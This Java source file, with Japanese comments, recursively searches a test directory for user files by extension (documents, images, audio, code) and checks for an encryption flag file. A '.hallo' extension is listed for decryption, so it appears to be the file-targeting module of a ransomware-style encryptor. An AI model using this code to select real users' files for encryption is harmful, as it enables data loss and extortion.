package finder;

import tools.FileUtillity;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static cipher.CryptionKeys.A_FLAG_FILE;

public class SearchTarget {

  private String path;
  // ターゲットになるファイルのリスト
  private List<File> targetList = new ArrayList<>();
  // ターゲットにしたい拡張子のリスト
  private List<String> targetExtensionList = Arrays.asList(
      ".mp3",
      ".txt",
      ".java",
      ".jpg",
      ".jpeg",
      ".png",
      ".pdf",
      ".docx",
      ".py",
      ".hallo" // TODO 暫定:: 復号化の際に詮索対象になるように追加
  );

  // TODO path getter & setter

  public SearchTarget() {
    searchDir(GetTestPath.TEST_PATH);
    this.path = GetTestPath.TEST_PATH;
  }

  public List<File> getTargetList() {
    return targetList;
  }

  private void searchDir(String path) {
    // path 指定 dir 内のファイルリスト
    File[] fileList = new File(path).listFiles();
    if (fileList == null) return;

    // ターゲットのファイルをターゲットリストに追加
    Arrays.stream(fileList)
        .filter(this::isTargetFile)
        .forEach(targetList::add);

    // ディレクトリの場合、再帰検索でターゲットリストに追加
    Arrays.stream(fileList)
        .filter(File::isDirectory)
        .forEach(file -> {
          try {
            searchDir(file.getCanonicalPath());
          } catch (IOException e) {
            e.printStackTrace();
          }
        });
  }

  private boolean isTargetFile(File file) {
    return !file.isDirectory() && targetExtensionList.contains(FileUtillity.getExtension(file));
  }

  public boolean hasEncryptFlag() {
    File targetDir = new File(this.path);
    return Arrays.stream(targetDir.listFiles())
        .anyMatch(file -> file.getName().equals(A_FLAG_FILE));
  }
}
